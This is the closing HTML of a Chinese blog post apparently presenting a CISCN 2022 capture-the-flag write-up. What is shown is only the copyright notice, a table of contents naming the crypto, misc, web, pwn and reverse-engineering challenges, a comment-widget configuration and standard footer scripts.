+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/">https://sakurahack-y.github.io/2022/06/20/ciscn2022初赛/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ciscn/">ciscn</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">1.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">签到:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8C%91%E6%88%98%E7%A0%81%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%811"><span class="toc-number">1.2.</span> <span class="toc-text">基于挑战码的双向认证1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8C%91%E6%88%98%E7%A0%81%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%812"><span class="toc-number">1.3.</span> <span class="toc-text">基于挑战码的双向认证2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8C%91%E6%88%98%E7%A0%81%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%813"><span class="toc-number">1.4.</span> <span class="toc-text">基于挑战码的双向认证3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7"><span class="toc-number">2.1.</span> <span class="toc-text">问卷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E6%B5%81%E9%87%8F"><span class="toc-number">2.2.</span> <span class="toc-text">键盘流量</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezpop"><span class="toc-number">3.1.</span> <span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpentest"><span class="toc-number">3.2.</span> <span class="toc-text">ezpentest</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">4.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn1"><span class="toc-number">4.1.</span> <span class="toc-text">Pwn1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">5.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#re1"><span class="toc-number">5.1.</span> <span class="toc-text">re1</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/06/27/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/">&lt; 内网学习篇</a><a class="next" href="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/">web随缘刷 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
